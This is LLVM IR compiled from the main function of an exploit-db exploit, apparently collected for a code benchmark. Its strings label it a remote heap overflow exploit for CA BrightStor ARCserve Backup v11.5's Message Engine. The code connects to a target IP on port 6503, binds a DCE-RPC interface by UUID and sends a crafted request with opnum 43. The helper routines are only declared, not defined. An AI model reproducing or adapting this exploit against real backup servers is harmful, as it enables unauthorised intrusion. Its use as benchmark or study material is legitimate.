; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_28765.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_28765.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.uuid = private unnamed_addr constant [37 x i8] c"dc246bf0-7a7a-11ce-9f88-00805fe43838\00", align 16
@.str = private unnamed_addr constant [21 x i8] c"\0A[-] Usage: %s <ip>\0A\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"\0A[+] LSsec.com\0A\00", align 1
@.str.2 = private unnamed_addr constant [86 x i8] c"\0A[+] CA BrightStor ARCserve Backup v11.5 Message Engine Remote Heap Overflow Exploit\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [64 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i16, align 2
  %12 = alloca [37 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %8, align 8
  store i32 43, i32* %10, align 4
  store i16 6503, i16* %11, align 2
  %13 = bitcast [37 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([37 x i8], [37 x i8]* @__const.main.uuid, i32 0, i32 0), i64 37, i1 false)
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 %14, 2
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0), i8* %19)
  %21 = call i32 @exit(i32 1) #4
  unreachable

22:                                               ; preds = %2
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.2, i64 0, i64 0))
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = load i16, i16* %11, align 2
  %29 = call i32 @lsConnect(i8* %27, i16 zeroext %28)
  store i32 %29, i32* %6, align 4
  %30 = getelementptr inbounds [64 x i8], [64 x i8]* %9, i64 0, i64 0
  %31 = call i32 @memset(i8* %30, i8 signext 0, i32 64)
  %32 = getelementptr inbounds [64 x i8], [64 x i8]* %9, i64 0, i64 0
  %33 = getelementptr inbounds [37 x i8], [37 x i8]* %12, i64 0, i64 0
  %34 = getelementptr inbounds [37 x i8], [37 x i8]* %12, i64 0, i64 0
  %35 = call i32 @strlen(i8* %34)
  %36 = call i32 @strncpy(i8* %32, i8* %33, i32 %35)
  %37 = getelementptr inbounds [37 x i8], [37 x i8]* %12, i64 0, i64 0
  %38 = call i8* @lsDceRpcBind(i32 1, i8* %37, i32 1, i64* %7)
  store i8* %38, i8** %8, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i8*, i8** %8, align 8
  %41 = load i64, i64* %7, align 8
  %42 = call i32 @lsSend(i32 %39, i8* %40, i64 %41)
  %43 = load i32, i32* %6, align 4
  %44 = call i32 @lsRecv(i32 %43)
  %45 = load i8*, i8** %8, align 8
  %46 = call i32 @free(i8* %45)
  %47 = load i32, i32* %10, align 4
  %48 = getelementptr inbounds [64 x i8], [64 x i8]* %9, i64 0, i64 0
  %49 = call i8* @lsDceRpcReq(i32 1, i32 %47, i8* %48, i32 0, i32 3, i64* %7)
  store i8* %49, i8** %8, align 8
  %50 = load i32, i32* %6, align 4
  %51 = load i8*, i8** %8, align 8
  %52 = load i64, i64* %7, align 8
  %53 = call i32 @lsSend(i32 %50, i8* %51, i64 %52)
  %54 = load i32, i32* %6, align 4
  %55 = call i32 @lsRecv(i32 %54)
  %56 = load i8*, i8** %8, align 8
  %57 = call i32 @free(i8* %56)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @lsConnect(i8*, i16 zeroext) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i8* @lsDceRpcBind(i32, i8*, i32, i64*) #2

declare dso_local i32 @lsSend(i32, i8*, i64) #2

declare dso_local i32 @lsRecv(i32) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i8* @lsDceRpcReq(i32, i32, i8*, i32, i32, i64*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
